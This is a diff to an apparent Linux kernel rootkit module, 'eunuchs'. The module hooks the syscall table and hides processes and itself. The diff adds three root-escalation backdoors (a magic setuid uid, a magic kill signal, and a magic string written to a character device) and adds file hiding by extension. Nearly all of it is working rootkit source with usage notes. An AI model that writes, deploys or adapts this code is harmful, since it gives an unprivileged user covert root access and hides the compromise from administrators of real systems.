@@ -31,12 +31,20 @@ static unsigned long *sct = 0xc167b180;
  *      `echo lemmesee > /dev/eunuchs` to show the module in the loaded module
  *      list, so that it may be removed.
  *
- * To exploit the setuid intercept:
+ * Credential elevation... (3 ways)
+ * (1) via setuid intercept:
  *  In your desired program, call `setuid(0xdead)`. Any other target uid will
  *  function as usual, but this particular target uid will elevate to 0. See
  *  the program in tools/icanhazshell.c for proof of concept.
  *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
  *
+ * (2) via kill command:
+ *  If the user sends the magic signal (#defined by EUNUCHS_MAGIC_SIGNAL) to any
+ *  process, that user will be elevated to root.
+ * 
+ * (3) via char device:
+ *  If the user writes `icanhazr00t?` (NB: you need to properly escape this
+ *  string when echo'ing it), that user will be elevated to root.
  *
  * All other interaction with this module is done by writing to /dev/eunuchs.
  * Commands:
@@ -45,8 +53,10 @@ static unsigned long *sct = 0xc167b180;
  *                                    remove the LKM until after you make it
  *                                    visible again)
  *  lemmesee                        - show the LKM in lsmod
+ *  icanhazr00t?                    - elevates the user to root credentials
  *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
  *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
+ *  ohaiplzhidefile ext
  **/
 
 #include <linux/init.h>
@@ -75,15 +85,22 @@ MODULE_VERSION("1.0");
 MODULE_ALIAS("kthxbye");
 
 /**
- * We use the kernel's linked list implementation to track which pids to hide.
+ * We use the kernel's linked list implementation to track which pids and files
+ * to hide.
  **/
 typedef struct eunuchs_proc_hide_by_pid
 {
     struct list_head list;
     char *pid;
 } eunuchs_proc_hide_by_pid;
-
 LIST_HEAD(proc_hide_by_pid_list);
+
+typedef struct eunuchs_file_hide_by_ext
+{
+    struct list_head list;
+    char *ext;
+} eunuchs_file_hide_by_ext;
+LIST_HEAD(file_hide_by_ext_list);
 
 ////////////////////////////////////////////////////////////////////////////////
 // CHAR DEVICE
@@ -167,7 +184,20 @@ static ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t
     }
     else if(strncmp(a, "ohaiplzhidefile ", 15) == 0)
     {
+        char *p = a + 16;
         debug("want to hide file\n");
+        hide_file_by_ext(p);
+    }
+    else if(strncmp(a, "ohaiplzshowfile ", 15) == 0)
+    {
+        char *p = a + 16;
+        debug("want to show file\n");
+        show_file_by_ext(p);
+    }
+    else if(strncmp(a, "icanhazr00t?", 12) == 0)
+    {
+        debug("want to elevate creds\n");
+        eunuchs_elevate_creds();
     }
 #ifdef DEBUG
     else if(strncmp(a, "ohaiplzshowallhiding", 20) == 0)
@@ -249,34 +279,47 @@ static typeof(sys_read) *orig_read;
 static typeof(sys_getdents) *orig_getdents;
 static typeof(sys_getdents64) *orig_getdents64;
 static typeof(sys_setuid) *orig_setuid;
+static typeof(sys_kill) *orig_kill;
+
+/**
+ * eunuchs_elevate_uid() -
+ *  Elevates the credentials of a process.
+ **/
+static int eunuchs_elevate_creds(void)
+{
+    struct cred *creds = NULL;
+    debug("setting uid to 0\n");
+
+    creds = prepare_creds();
+    if(creds == NULL)
+        return -1;
+
+    creds->uid = (kuid_t){ 0 };
+    creds->gid = (kgid_t){ 0 };
+    creds->suid = (kuid_t){ 0 };
+    creds->sgid = (kgid_t){ 0 };
+    creds->euid = (kuid_t){ 0 };
+    creds->egid = (kgid_t){ 0 };
+    creds->fsuid = (kuid_t){ 0 };
+    creds->fsgid = (kgid_t){ 0 };
+
+    return commit_creds(creds);
+}
 
 /**
  * setuid() handler.
- * If the provided target uid is our superdupermagical uid, set uid to 0.
+ *  If the provided target uid is our superdupermagical uid, set uid to 0.
+ *
+ *  see https://www.kernel.org/doc/Documentation/security/credentials.txt
  **/
 static asmlinkage long eunuchs_setuid(uid_t uid)
 {
-    struct cred *creds = NULL;
 
     debug("setuid intercepted\n");
 
     if(uid == EUNUCHS_MAGIC_UID)
     {
-       debug("setting uid to 0\n");
-        creds = prepare_creds();
-        if(creds == NULL)
-            return -1;
-
-        creds->uid = (kuid_t){ 0 };
-        creds->gid = (kgid_t){ 0 };
-        creds->suid = (kuid_t){ 0 };
-        creds->sgid = (kgid_t){ 0 };
-        creds->euid = (kuid_t){ 0 };
-        creds->egid = (kgid_t){ 0 };
-        creds->fsuid = (kuid_t){ 0 };
-        creds->fsgid = (kgid_t){ 0 };
-
-        return commit_creds(creds);
+        return eunuchs_elevate_creds();
     }
     else
     {
@@ -310,6 +353,23 @@ static asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 
 {
     /* debug("got getdents64 call\n"); */
     return orig_getdents64(fd, fp, count);
+}
+
+/**
+ * kill() handler. This is so that we can `kill -s [magic_signal_number] [pid]` to elevate
+ * creds.
+ **/
+static asmlinkage long eunuchs_kill(pid_t pid, int sig)
+{
+    if(sig == EUNUCHS_MAGIC_SIGNAL)
+    {
+        debug("got magic signal\n");
+        return eunuchs_elevate_creds();
+    }
+    else
+    {
+        return orig_kill(pid, sig);
+    }
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -346,6 +406,64 @@ static void cr0_disable_write()
 }
 
 ////////////////////////////////////////////////////////////////////////////////
+// FILE HIDING
+//
+//   based on process hiding (see below)
+
+/**
+ * hide_file_by_ext(char *) -
+ *  Hides all files that end in the supplied extension.
+ **/
+static int hide_file_by_ext(char *ext)
+{
+    eunuchs_file_hide_by_ext *f = NULL;
+    debug("hiding files with extension [%s]\n", ext);
+
+    f = kmalloc(sizeof(eunuchs_file_hide_by_ext), GFP_KERNEL);
+    if(!f)
+        return -1;
+
+    f->ext = kmalloc(sizeof(char) * (strlen(ext) + 1), GFP_KERNEL);
+    if(!f->ext)
+        return -1;
+
+    strncpy(f->ext, ext, strlen(ext) + 1);
+    list_add(&f->list, &file_hide_by_ext_list);
+    return 0;
+}
+
+/**
+ * show_file_by_ext(char *) -
+ *  Shows all files that end in the supplied extension.
+ **/
+static int show_file_by_ext(char *ext)
+{
+    eunuchs_file_hide_by_ext *show = NULL, *tmp = NULL;
+    debug("showing files with extension [%s]\n", ext);
+
+    list_for_each_entry_safe(show, tmp, &file_hide_by_ext_list, list)
+    {
+        if(strcmp(show->ext, ext) == 0)
+        {
+            list_del(&show->list);
+            kfree(show->ext);
+            kfree(show);
+        }
+    }
+    return 0;
+}
+
+static int file_hide_init(void)
+{
+    return 0;
+}
+
+static int file_hide_remove(void)
+{
+    return 0;
+}
+
+////////////////////////////////////////////////////////////////////////////////
 // PROCESS HIDING
 //
 //   adapted from / inspired by
@@ -378,7 +496,7 @@ static int show_proc_by_pid(char *pid)
     {
         if(strcmp(show->pid,pid) == 0)
         {
-            list_del(&(show->list));
+            list_del(&show->list);
             kfree(show->pid);
             kfree(show);
         }
@@ -389,8 +507,8 @@ static int show_proc_by_pid(char *pid)
 static struct file_operations proc_fileops;
 static struct file_operations *backup_proc_fileops;
 static struct inode *proc_inode;
-static struct path p;
-static struct dir_context *backup_ctx;
+static struct path proc_p;
+static struct dir_context *proc_backup_ctx;
 
 /**
  * eunuchs_proc_filldir(struct dir_context *, const char *, int, loff_t,
@@ -413,7 +531,7 @@ static int eunuchs_proc_filldir(struct dir_context *d_ctx, const char *proc_name
         }
     }
 
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, inode, d_type);
+    return proc_backup_ctx->actor(proc_backup_ctx, proc_name, len, off, inode, d_type);
 }
 
 /* a dir_context that contains our filldir function */
@@ -430,7 +548,7 @@ static int eunuchs_proc_iterate_shared(struct file *file, struct dir_context *ct
 {
     int res = 0;
     eunuchs_proc_ctx.pos = ctx->pos;
-    backup_ctx = ctx;
+    proc_backup_ctx = ctx;
     res = backup_proc_fileops->iterate_shared(file, &eunuchs_proc_ctx);
     ctx->pos = eunuchs_proc_ctx.pos;
 
@@ -446,11 +564,11 @@ static int process_hide_init(void)
 {
     debug("hijacking /proc vfs & file ops\n");
 
-    if(kern_path("/proc", 0, &p))
+    if(kern_path("/proc", 0, &proc_p))
         return -1;
 
     /* get the inode & make a backup of the fileops */
-    proc_inode = p.dentry->d_inode;
+    proc_inode = proc_p.dentry->d_inode;
     backup_proc_fileops = proc_inode->i_fop;
 
     /* modify the file ops to use our iterator instead */
@@ -469,11 +587,11 @@ static void process_hide_remove(void)
 {
     debug("restoring /proc vfs & file ops\n");
 
-    if(kern_path("/proc", 0, &p))
+    if(kern_path("/proc", 0, &proc_p))
         return;
 
     // restore the proc vfs & file operations
-    proc_inode = p.dentry->d_inode;
+    proc_inode = proc_p.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fileops;
 
 }
@@ -485,11 +603,18 @@ static void process_hide_remove(void)
 static int eunuchs_lists_show_all(void)
 {
     eunuchs_proc_hide_by_pid *p = NULL;
+    eunuchs_file_hide_by_ext *f = NULL;
 
     debug("Hide by pid list contains:\n");
     list_for_each_entry(p, &proc_hide_by_pid_list, list)
     {
         debug("[%s]\n", p->pid);
+    }
+
+    debug("Hide by file extension list contains:\n");
+    list_for_each_entry(f, &file_hide_by_ext_list, list)
+    {
+        debug("[%s]\n", f->ext);
     }
 }
 #endif
@@ -529,6 +654,7 @@ static void eunuchs_lists_free(void)
 {
     /* eunuchs_proc_hide_by_user *ud = NULL, *ud2 = NULL; */
     eunuchs_proc_hide_by_pid *pd = NULL, *pd2 = NULL;
+    eunuchs_file_hide_by_ext *fd = NULL, *fd2 = NULL;
 
     debug("freeing lists\n");
 
@@ -543,18 +669,28 @@ static void eunuchs_lists_free(void)
      * }
      */
 
-    /* free hide by pid list */
+    /* free hide process by pid list */
     list_for_each_entry_safe(pd, pd2, &proc_hide_by_pid_list, list)
     {
         debug("removing %s from pid hiding list\n", pd->pid);
         list_del(&pd->list);
         kfree(pd);
     }
+
+    /* free hide files by extension list */
+    list_for_each_entry_safe(fd, fd2, &file_hide_by_ext_list, list)
+    {
+        debug("removing %s from file extension hiding list\n", fd->ext);
+        list_del(&fd->list);
+        kfree(fd->ext);
+        kfree(fd);
+    }
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 // MAIN DRIVERS
 
+/* list of all modules (what lsmod shows) */
 static struct list_head *mod_list = NULL;
 
 /**
@@ -604,6 +740,9 @@ static int eunuchs_hooks_install(void)
     orig_setuid = (typeof(sys_setuid) *)sct[__NR_setuid32];
     sct[__NR_setuid32] = (void *)&eunuchs_setuid;
 
+    orig_kill = (typeof(sys_kill) *)sct[__NR_kill];
+    sct[__NR_kill] = (void *)&eunuchs_kill;
+
     return 0;
 }
 
@@ -618,6 +757,7 @@ static void eunuchs_hooks_remove(void)
     sct[__NR_getdents] = (void *)orig_getdents;
     sct[__NR_getdents64] = (void *)orig_getdents64;
     sct[__NR_setuid32] = (void *)orig_setuid;
+    sct[__NR_kill] = (void *)orig_kill;
 }
 
 /**
@@ -638,11 +778,12 @@ static int eunuchs_init(void)
     /* install hooks */
     cr0_enable_write();
     eunuchs_hooks_install();
+    file_hide_init();
     process_hide_init();
     cr0_disable_write();
 
     /* hide the module */
-    eunuchs_hide_lkm();
+    /* eunuchs_hide_lkm(); */
 
     return 0;
 }
@@ -658,6 +799,7 @@ static void eunuchs_exit(void)
 
     cr0_enable_write();
     eunuchs_hooks_remove();
+    file_hide_remove();
     process_hide_remove();
     cr0_disable_write();
 
